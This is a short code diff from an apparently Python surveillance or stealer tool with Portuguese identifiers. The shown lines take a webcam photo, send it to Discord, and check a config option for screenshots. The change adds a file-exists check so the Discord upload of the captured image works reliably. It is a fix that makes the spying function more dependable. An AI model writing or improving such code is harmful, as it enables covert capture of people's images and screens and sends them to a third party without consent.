@@ -341,7 +341,8 @@ if __name__ == "__main__":
             webcam_foto = capture_photo()
             executou_webcam_foto = True
             webcam_path = os.path.join(pasta_nyx, 'webcam_foto.jpg')
-            enviar_imagem_para_discord(webcam_path)
+            if os.path.exists(webcam_path):
+                enviar_imagem_para_discord(webcam_path)
         
         if not executou_screenshot and cfg.get("screenshot", False):
             screenshot = Sprint()
